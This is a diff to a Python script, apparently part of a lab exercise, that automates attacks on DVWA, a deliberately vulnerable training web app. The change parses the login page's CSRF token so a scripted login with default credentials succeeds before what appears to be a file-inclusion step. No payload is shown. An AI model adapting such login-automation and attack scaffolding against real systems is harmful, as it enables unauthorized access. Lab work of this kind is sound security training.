@@ -48,9 +48,13 @@ def attack() -> None:
 
     headers = {"X-Lab-Client-IP": ATTACKER_IP, "User-Agent": "M8-v2-s06-lfi"}
     session = requests.Session()
+    from s05 import Inputs
+
     login_page = session.get(f"{EDGE}/login.php", headers=headers, timeout=15)
     if login_page.status_code != 200:
         raise RuntimeError("DVWA login page did not load")
+    login_fields = Inputs()
+    login_fields.feed(login_page.text)
     login = session.post(
         f"{EDGE}/login.php",
         headers={**headers, "X-Lab-Step": "training_account_login"},
@@ -58,14 +62,13 @@ def attack() -> None:
             "username": os.environ.get("DVWA_ADMIN_USER", "admin"),
             "password": os.environ.get("DVWA_ADMIN_PASSWORD", "password"),
             "Login": "Login",
+            "user_token": login_fields.values.get("user_token", ""),
         },
         timeout=15,
         allow_redirects=True,
     )
     if login.status_code != 200 or 'name="username"' in login.text:
         raise RuntimeError("DVWA training account login failed")
-    from s05 import Inputs
-
     security = session.get(f"{EDGE}/security.php", headers=headers, timeout=15)
     fields = Inputs()
     fields.feed(security.text)
